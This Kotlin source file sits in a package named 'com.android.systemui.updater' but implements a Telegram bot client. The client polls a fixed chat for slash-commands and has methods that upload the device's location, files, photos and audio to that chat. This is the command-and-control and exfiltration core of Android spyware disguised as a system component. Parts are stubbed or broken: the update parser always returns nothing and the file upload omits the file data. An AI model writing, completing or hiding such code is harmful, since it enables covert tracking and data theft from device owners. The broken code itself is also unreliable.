package com.android.systemui.updater

import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import java.io.IOException
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.ArrayList
import java.util.List

/**
 * Telegram client for sending and receiving messages via Telegram Bot API.
 */
class TelegramClient(
    private val context: Context,
    private val botToken: String,
    private val chatId: String
) {
    private companion object {
        private const val TAG = "TelegramClient"
        private const val PREFS_NAME = "telegram_prefs"
        private const val KEY_LAST_UPDATE_ID = "last_update_id"
    }

    private val prefs: SharedPreferences by lazy {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    /**
     * Fetches new updates from Telegram and processes them.
     * After processing, saves the last update ID to SharedPreferences.
     */
    fun getNewCommands(): List<Command> {
        val lastUpdateId = prefs.getLong(KEY_LAST_UPDATE_ID, 0)
        val urlString = "https://api.telegram.org/bot$botToken/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
        val response = httpGet(urlString)
        val updates = parseUpdates(response)
        val commands = ArrayList<Command>()

        for (update in updates) {
            val updateId = update["update_id"] as? Long ?: continue
            val message = update["message"] as? Map<String, *> ?: continue

            // Process message to extract command
            val command = extractCommand(message)
            if (command != null) {
                commands.add(command)
            }

            // Update lastUpdateId to the current update ID
            prefs.edit().putLong(KEY_LAST_UPDATE_ID, updateId).apply()
        }

        return commands
    }

    /**
     * Sends a text message to the configured chat.
     */
    fun sendText(text: String) {
        val urlString = "https://api.telegram.org/bot$botToken/sendMessage"
        val params = "chat_id=$chatId&text=$text"
        httpPost(urlString, params)
    }

    /**
     * Sends a location to the configured chat.
     */
    fun sendLocation(latitude: Double, longitude: Double) {
        val urlString = "https://api.telegram.org/bot$botToken/sendLocation"
        val params = "chat_id=$chatId&latitude=$latitude&longitude=$longitude"
        httpPost(urlString, params)
    }

    /**
     * Sends a file to the configured chat.
     */
    fun sendFile(filePath: String) {
        val urlString = "https://api.telegram.org/bot$botToken/sendDocument"
        multipartUpload(urlString, "chat_id", chatId, "document", filePath)
    }

    /**
     * Sends a photo to the configured chat.
     */
    fun sendPhoto(filePath: String) {
        val urlString = "https://api.telegram.org/bot$botToken/sendPhoto"
        multipartUpload(urlString, "chat_id", chatId, "photo", filePath)
    }

    /**
     * Sends an audio file to the configured chat.
     */
    fun sendAudio(filePath: String) {
        val urlString = "https://api.telegram.org/bot$botToken/sendAudio"
        multipartUpload(urlString, "chat_id", chatId, "audio", filePath)
    }

    /**
     * Performs an HTTP GET request.
     */
    private fun httpGet(urlString: String): String {
        return try {
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            val inputStream: InputStream = connection.inputStream
            val response = inputStream.bufferedReader().readText()
            connection.disconnect()
            response
        } catch (e: IOException) {
            ErrorReporter.reportException(e, "HTTP GET failed: $urlString")
            throw e
        }
    }

    /**
     * Performs an HTTP POST request.
     */
    private fun httpPost(urlString: String, params: String) {
        try {
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            connection.outputStream.write(params.toByteArray())
            val responseCode = connection.responseCode
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw IOException("HTTP POST failed with code $responseCode")
            }
            connection.disconnect()
        } catch (e: IOException) {
            ErrorReporter.reportException(e, "HTTP POST failed: $urlString")
            throw e
        }
    }

    /**
     * Performs a multipart file upload.
     */
    private fun multipartUpload(
        urlString: String,
        param1Name: String,
        param1Value: String,
        fileParamName: String,
        filePath: String
    ) {
        // Implementation would use HttpURLConnection with multipart/form-data
        // This is a simplified placeholder; actual implementation would be more complex
        try {
            val url = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW")
            // Write multipart data (simplified)
            val output = connection.outputStream
            output.write("------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n".toByteArray())
            output.write("Content-Disposition: form-data; name=\"$param1Name\"\r\n\r\n".toByteArray())
            output.write("$param1Value\r\n".toByteArray())
            output.write("------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n".toByteArray())
            output.write("Content-Disposition: form-data; name=\"$fileParamName\"; filename=\"${filePath.substring(filePath.lastIndexOf('/') + 1)}\"\r\n".toByteArray())
            output.write("Content-Type: application/octet-stream\r\n\r\n".toByteArray())
            // In real implementation, we would stream the file content here
            // For simplicity, we're omitting the actual file reading
            output.write("\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n".toByteArray())
            output.flush()
            val responseCode = connection.responseCode
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw IOException("Multipart upload failed with code $responseCode")
            }
            connection.disconnect()
        } catch (e: IOException) {
            ErrorReporter.reportException(e, "Multipart upload failed: $urlString")
            throw e
        }
    }

    /**
     * Parses the JSON response from getUpdates into a list of maps.
     * This is a simplified parser; in reality, you'd use a JSON library.
     */
    private fun parseUpdates(json: String): List<Map<String, *>> {
        // Simplified parsing - actual implementation would use a proper JSON parser
        val updates = mutableListOf<Map<String, *>>()
        // Placeholder: in a real app, you'd parse the JSON structure
        // For example: {"ok":true,"result":[{"update_id":123,"message":{...}}, ...]}
        // We'll return an empty list for this example
        return updates
    }

    /**
     * Extracts a command from a message map.
     * This is a placeholder implementation.
     */
    private fun extractCommand(message: Map<String, *>): Command? {
        val text = message["text"] as? String ?: return null
        if (text.startsWith("/")) {
            return Command(text.substring(1), message["chat"] as? Map<String, *>)
        }
        return null
    }

    /**
     * Represents a Telegram command.
     */
    data class Command(
        val name: String,
        val chat: Map<String, *>? = null
    )
}

/**
 * Simple error reporter for logging exceptions.
 */
object ErrorReporter {
    fun reportException(e: Exception, context: String) {
        Log.e("TelegramClient", context, e)
    }
}